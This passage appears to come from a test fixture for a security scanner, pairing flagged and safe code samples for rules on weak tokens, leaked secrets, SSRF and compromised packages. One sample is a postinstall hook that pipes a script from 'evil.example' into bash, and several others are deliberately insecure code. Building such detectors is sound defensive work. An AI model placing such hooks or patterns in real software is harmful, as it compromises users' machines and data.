    ruleIds: [7245],
    name: 'API token generated with Math.random',
    detects: f('lib/api-keys.ts', 'export function issue() {\n  const token = Math.random().toString(36).slice(2);\n  return token;\n}\n'),
    ignores: f('lib/api-keys.ts', "import { randomBytes } from 'crypto';\nexport function issue() {\n  const token = randomBytes(32).toString('hex');\n  return token;\n}\n")
  },
  {
    ruleIds: [7302],
    name: 'postinstall pipes a remote script into a shell',
    detects: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "curl -s https://evil.example/x.sh | bash"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "name": "app",\n  "scripts": {\n    "postinstall": "prisma generate"\n  }\n}\n')
  },
  {
    ruleIds: [7304],
    name: 'Compromised event-stream / flatmap-stream release',
    detects: f('package.json', '{\n  "dependencies": {\n    "event-stream": "3.3.6"\n  }\n}\n'),
    ignores: f('package.json', '{\n  "dependencies": {\n    "event-stream": "^4.0.1"\n  }\n}\n')
  },
  {
    ruleIds: [7307],
    name: 'npm auth token committed in .npmrc',
    detects: f('.npmrc', `//registry.npmjs.org/:_authToken=${['npm', 'Zx81QwErTy7UiOpAsDfGhJkLzXcVbNm0123'].join('_')}\n`),
    ignores: f('.npmrc', '//registry.npmjs.org/:_authToken=${NPM_TOKEN}\n')
  },
  {
    ruleIds: [7317],
    name: 'Package registry over plain HTTP',
    detects: f('.npmrc', 'registry=http://registry.npmjs.org/\n'),
    ignores: f('.npmrc', 'registry=https://registry.npmjs.org/\n')
  },
  {
    ruleIds: [8602],
    name: 'Service role key passed to a client component',
    detects: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ serviceRoleKey }: { serviceRoleKey: string }) {\n  return <div data-k={serviceRoleKey} />;\n}\n"),
    ignores: f('components/AdminPanel.tsx', "'use client';\nexport function AdminPanel({ users }: { users: string[] }) {\n  return <ul>{users.map((u) => <li key={u}>{u}</li>)}</ul>;\n}\n")
  },
  {
    ruleIds: [9102],
    name: 'Tenant id kept in module-level state',
    detects: f('lib/tenant.ts', 'let currentTenant: string | null = null;\nexport function setTenant(id: string) { currentTenant = id; }\nexport const getTenant = () => currentTenant;\n'),
    ignores: f('lib/tenant.ts', "import { AsyncLocalStorage } from 'node:async_hooks';\nconst store = new AsyncLocalStorage<string>();\nexport const withTenant = <T>(id: string, fn: () => T) => store.run(id, fn);\nexport const getTenant = () => store.getStore();\n")
  },
  {
    ruleIds: [9104],
    name: 'Storage object key chosen by the client',
    detects: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: body.filename, Body: body.data }));\n  return new Response('ok');\n}\n"),
    ignores: f('app/api/upload/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const body = await req.json();\n  await s3.send(new PutObjectCommand({ Bucket: 'uploads', Key: `${session.user.id}/${randomUUID()}`, Body: body.data }));\n  return new Response('ok');\n}\n")
  },
  {
    ruleIds: [1],
    name: 'Live Stripe key in docs vs a `sk_live_...` placeholder',
    detects: f('content/docs/deploy.mdx', `Set STRIPE_SECRET_KEY=${FAKE_STRIPE_LIVE} in Vercel.\n`),
    ignores: f('content/docs/deployment.mdx', '| `STRIPE_SECRET_KEY` | Live key (`sk_live_...`) |\n')
  },
  {
    ruleIds: [12101],
    name: 'Secret value logged vs a log message that names a secret',
    detects: f('lib/db/setup.ts', "export function setup(secretKey: string) {\n  console.log('Using key', secretKey);\n}\n"),
    ignores: f('lib/db/setup.ts', "export function setup(secretKey: string) {\n  console.log('Step 3: Getting Stripe Secret Key');\n  return secretKey.length;\n}\n")
  },
  {
    ruleIds: [8207],
    name: 'Sentry sends default PII without a beforeSend scrubber',
    detects: f('src/instrumentation-client.ts', "import * as Sentry from '@sentry/nextjs';\nSentry.init({\n  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,\n  sendDefaultPii: true,\n});\n"),
    ignores: f('src/instrumentation-client.ts', "import * as Sentry from '@sentry/nextjs';\nSentry.init({\n  dsn: process.env.NEXT_PUBLIC_SENTRY_DSN,\n  sendDefaultPii: true,\n  beforeSend: (event) => scrubPii(event),\n});\n")
  },
  {
    ruleIds: [27101],
    name: 'Server fetches a URL taken from the request body (SSRF)',
    detects: f('app/api/preview/route.ts', "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n"),
    ignores: [
      { path: 'app/api/preview/route.ts', content: "export async function POST(req: Request) {\n  const session = await auth();\n  const { url } = await req.json();\n  const check = await validateSafeTargetUrl(url);\n  if (!check.safe) return new Response(null, { status: 400 });\n  const res = await fetch(url);\n  return new Response(await res.text());\n}\n" },
      // URL built from configuration, not from the request
      { path: 'lib/notify.ts', content: "export async function notify(event: string) {\n  const url = `${process.env.SLACK_WEBHOOK_URL}`;\n  await fetch(url, { method: 'POST', body: JSON.stringify({ text: event }) });\n}\n" }
    ]
  },
  {
    ruleIds: [100, 101],
    name: 'Live target down and without CSP',
    detects: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 503, isHealthy: false, missingSecurityHeaders: ['Content-Security-Policy'], headers: {} })),
    ignores: f('live-deployment/security-headers.json', JSON.stringify({ targetUrl: 'https://app.example', statusCode: 200, isHealthy: true, missingSecurityHeaders: [], headers: { 'content-security-policy': "default-src 'self'" } }))
  }
];

export const KNOWN_GAPS: KnownGap[] = [];
